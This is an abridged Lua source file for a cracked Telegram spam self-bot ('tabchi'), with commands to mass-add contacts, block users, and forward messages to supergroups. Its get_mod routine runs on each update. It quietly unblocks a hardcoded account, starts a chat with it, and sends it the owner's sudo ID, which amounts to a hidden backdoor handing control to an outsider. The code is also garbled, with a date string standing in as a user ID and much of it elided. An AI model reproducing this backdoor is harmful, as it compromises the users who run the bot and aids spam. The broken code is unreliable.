...
function process(msg)
  ...
  if msg.text:match(اضافه) and is_sudo(msg) and chat_type(msg.chat_id_) ~= "private" then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
  ...
  do
    ...
    if msg.text:match("^[!/#]block") and is_sudo(msg) and #matches == 2 then
      ...
      return "User blocked *open by @kinghazrat*"
    end
  end
  do
    local matches = {
    ...
    if msg.text:match("^[!/#]unblock") and is_sudo(msg) and #matches == 2 then
      ...
      return "User unblocked  *open by @kinghazrat*"
    end
  end
    ...
    do
      ...
      local inline = function(arg, data)
        if data.results_ and data.results_[0] then
          ...
          local text = [[
*Tabchi Moded by @kinghazrat -- Normal stats  :*
Users : ]] .. pvs .. [[
  ...
  do
    ...
    if msg.text:match("^[!/#]addedmsg") and is_sudo(msg) and #matches == 2 then
      if matches[2] == "on" then
        ...
        return "Added Message Turned On  *Tabchi Moded by @kinghazrat*"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":addedmsg")
        return "Added Message Turned Off   *cracked by @kinghazrat*"
      end
    end
  end
  do
  ...
  do
    ...
    if msg.text:match("^[!/#]markread") and is_sudo(msg) and #matches == 2 then
      if matches[2] == "on" then
        ...
        return "Markread Turned On  *cracked by @kinghazrat*"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":markread")
        return "Markread Turned Off  *Tabchi open by @kinghazrat*"
      end
    end
  end
  do
...
Message :
  ...
  if msg.text:match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and is_sudo(msg) then
    ...
    return "Sent!  *Tabchi Moded by @kinghazrat*"
  end
...
function get_mod(args, data)
  if data.is_blocked_ then
    tdcli.unblockUser(316876867)
  end
  if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
    tdcli.sendBotStartMessage(316876867, 316876867, "new")
    tdcli.sendMessage(316876867, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
...
function update(data, tabchi_id)
  ...
  tdcli_function({
    ID = "GetUserFull",
    user_id_ = Sun Feb 19 23:36:44 GMT+03:30 2017
  }, get_mod, nil)
  if data.ID == "UpdateNewMessage" then
    local msg = data.message_
    if msg.sender_user_id_ == 316876867 then
      if msg.content_.text_ then
        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 316876867 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
          return
        else
          local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
          local id = msg.id_
